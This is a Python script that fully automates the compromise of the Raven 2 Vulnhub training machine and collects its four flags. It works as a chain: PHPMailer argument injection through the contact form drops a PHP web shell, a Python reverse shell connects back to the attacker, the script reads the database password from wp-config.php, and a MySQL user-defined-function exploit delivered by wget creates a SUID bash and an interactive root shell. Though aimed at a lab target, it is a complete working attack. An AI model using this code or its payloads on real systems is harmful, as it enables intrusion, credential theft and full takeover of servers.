# Raven 2 - Vulnhub Machine 0Click RCE Exploit
# https://www.vulnhub.com/entry/raven-2,269/
# Given exploit PHPMailer vulnerability to achieve code execution
# Then using mysql exploit to gain root access
# for a reverse shell, This time I went with proper way and used sockets

# https://github.com/Z3R013x/OSWE-Like-0Click
# https://pwnit.io/category/oswe-like-machines/


import requests
import argparse
from string import ascii_lowercase
import random
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Timer
import socket
import base64
from time import sleep
import threading


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_warning(text):
    print(f"{bcolors.WARNING}[-] {text}{bcolors.ENDC}")


def print_success(text):
    print(f"{bcolors.OKGREEN}[+] {text}{bcolors.ENDC}")


def print_info(text):
    print(f"{bcolors.OKCYAN}[*] {text}{bcolors.ENDC}")


def print_fail(text):
    print(f"{bcolors.FAIL}[!] {text}{bcolors.ENDC}")


parser = argparse.ArgumentParser(description='exploit configuration',
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument('-t', '--rhost', type=str, help="Target IP", required=True)
parser.add_argument('-rp', '--rport', type=int, help="Target Port", default="80", required=False)
parser.add_argument('-l', '--lhost', type=str, help="Local IP", required=True)
parser.add_argument('-lp', '--lport', type=int, help="Local Port", default="4444", required=False)
parser.add_argument('-d', '--debug-proxy', type=str,
                    help="if passed, all requests will go trough proxy please provide HTTP proxy with format of ip:port",
                    required=False,
                    default="")
parser.add_argument('-hp', '--httpport', type=int, help="Local Port for HTTP Server", default="8000", required=False)

args = parser.parse_args()

proxy = {"http": f"{args.debug_proxy}"}
full_path = ""

flags = []


class FileServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            raptor_lib = open("raptor_udf2.so", "rb").read()
        except FileNotFoundError:
            print_warning("precompiled raptor_udf2.so is required in order to successfully exploit the vulnerability")
            exit(1)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        # Send the file content as the response
        self.wfile.write(raptor_lib)


class ServerThread(threading.Thread):
    def __init__(self, server):
        threading.Thread.__init__(self)
        self.server = server

    def run(self):
        print("Starting server...")
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()
        print("Server stopped.")


def run_server(lhost, port=8000, server_class=HTTPServer, handler_class=FileServerHandler):
    server_address = (lhost, port)
    httpd = HTTPServer(server_address, FileServerHandler)
    server_thread = ServerThread(httpd)
    return server_thread


def trigger_webshell(url):
    try:
        requests.get(f"{url}")
    except requests.exceptions.Timeout:
        pass  # expected one
    except Exception as e:
        print_fail(f"Unexpected exception occured: {str(e)}")


def get_first_flag(rhost, rport, proxy):
    # easy one, it's exposed and can be reached without any access
    global full_path
    try:
        response = requests.get(f"http://{rhost}:{rport}/vendor/PATH", proxies=proxy)
        if response.status_code == 200:
            response_lines = response.text.splitlines()
            full_path = response_lines[0]
            flags.append(response_lines[1].strip())
            print_success("First flag captured successfully")

    except Exception as e:
        print_fail("Something went wrong, we got exception")
        print_fail(str(e))
        exit(1)


def get_rev_shell(rhost, rport, lhost, lport, fullpath, proxy):
    # Exploiting flaw in PHPMailer to achieve 2nd flag.
    # also, prints public location of 3rd flag.
    file_name = ''.join(random.choice(ascii_lowercase) for i in range(16)) + ".php"
    print_info(f"Uploading {file_name} into {fullpath} directory of target")
    email = f'"attacker\\" -oQ/tmp/ -X{fullpath.strip()}{file_name}  some"@email.com'
    paylaod = "<?php system($_GET['cmd']) ?>"
    request_data = {"action": "submit",
                    "name": "Test",
                    "email": email,
                    "message": paylaod
                    }
    response = requests.post(f"http://{rhost}:{rport}/contact.php", data=request_data, proxies=proxy)
    if response.status_code == 200:
        # Check if file was created
        backdoor_url = f"http://{rhost}:{rport}/vendor/{file_name}"
        backdoor_response = requests.get(backdoor_url)
        if backdoor_response.status_code == 200:
            print_success("backdoor was uploaded successfully")
        else:
            print_fail("backdoor was not uploaded, exiting")
            exit(1)
    else:
        print_fail("Something went wrong, please make sure RHOST and RPORT parameters are correct")
        exit(1)

    rev_shell_payload = f'python -c \'exec """\nimport socket\nimport subprocess as sp\ns = socket.socket(' \
                        f')\ns.connect(("{lhost}", {lport}))\nwhile True:\n    comm = s.recv(1024*20).decode()\n    p = ' \
                        f'sp.Popen(comm, shell=True, stdout=sp.PIPE, stderr=sp.STDOUT)\n    s.send(p.communicate()[' \
                        f'0])\n"""\''

    print_info("Starting socket listener for rev. shell")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((lhost, lport))
    s.listen()
    print_info("Triggering reverse shell")
    t = Timer(1, trigger_rev_shell, [backdoor_url, rev_shell_payload, proxy])
    t.start()
    conn, addr = s.accept()
    print_success("We got reverse shell")
    conn.send("cat /var/www/flag2.txt".encode())
    data = conn.recv(1024)
    print_success(f"We Got 2nd Flag, {data.decode().strip()}")
    flags.append(data.decode().strip())
    print_success(f"3rd flag - http://{rhost}:{rport}/wordpress/wp-content/uploads/2018/11/flag3.png")
    flags.append(f"http://{rhost}:{rport}/wordpress/wp-content/uploads/2018/11/flag3.png")
    return conn


def trigger_rev_shell(backdoor_url, payload, proxy):
    try:
        requests.get(backdoor_url, params={"cmd": payload}, proxies=proxy)
    except requests.exceptions.Timeout:
        # Expected one
        pass


def exploit_mysql(lhost, server_port, socket_connection):
    print_info("Starting HTTPServer to transport raptor_udf2.so exploit into target machine")
    server_thread = run_server(lhost, server_port)
    server_thread.start()
    socket_connection.send(f"wget http://{lhost}:{server_port} -O /tmp/raptor_udf2.so".encode())
    server_thread.join(timeout=2) # Shutdown after 2 seconds
    output = socket_connection.recv(1024).decode()
    print_info("Output from target:\n" + output)
    print_info("Stopping HTTP Server")
    # Getting DB Pass
    print_info("Getting DB Pass")
    socket_connection.send(f"cat ../wordpress/wp-config.php | grep DB_PASSWORD".encode())
    db_pass_line = socket_connection.recv(1024).decode()
    db_pass = db_pass_line.split("'DB_PASSWORD', '", )[1].split("');")[0].strip()
    print_success(f"Got DB Password: {db_pass}")
    print_info("Exploiting MYSQL to create SUID Copy of bash as root")
    random_name = ''.join(random.choice(ascii_lowercase) for _ in range(6))
    socket_connection.send(f"mysql -u root -p{db_pass} -e \""
                           f"use mysql;"
                           f"create table {random_name}(line blob);"
                           f"insert into {random_name} values(load_file('/tmp/raptor_udf2.so'));"
                           f"select * from {random_name} into dumpfile '/usr/lib/mysql/plugin/{random_name}.so';"
                           f"DROP FUNCTION do_system;"  # In case if it already exists
                           f"create function do_system returns integer soname '{random_name}.so';"
                           f"select do_system('cp /bin/bash /tmp/{random_name}');"
                           f"select do_system('chmod 777 /tmp/{random_name}');"
                           f"select do_system('chmod u+s /tmp/{random_name}');"
                           f"select do_system('chmod u+s /tmp/{random_name}');"
                           f"\"".encode())
    print_info(socket_connection.recv(1024).decode())
    print_info(f"Created SUID copy of bash in tmp folder with name {random_name}")
    print_info("Calling bash copy to get root flag")
    socket_connection.send(f"/tmp/{random_name} -p -c \"cat /root/flag4.txt\"".encode())
    flag_4 = socket_connection.recv(1024).decode().strip().split("\n")[5]
    print_success(f"The Final 4th flag is {flag_4.strip()}")
    flags.append(flag_4)
    print_info("All four flags:")
    for flag in flags:
        print_success(flag)
    print_info("Spawning shell as root (Little Unstable)")
    while True:
        command = input("#: ")
        root_command = f"/tmp/{random_name} -p -c '{command}'"
        socket_connection.send(root_command.encode())
        output = socket_connection.recv(1024).decode()
        print(output)


if __name__ == "__main__":
    get_first_flag(args.rhost, args.rport, proxy)
    socket_connection = get_rev_shell(args.rhost, args.rport, args.lhost, args.lport, full_path, proxy)
    print_info("Rooting service to achieve 4th flag")
    exploit_mysql(args.lhost, args.httpport, socket_connection)
    exit()
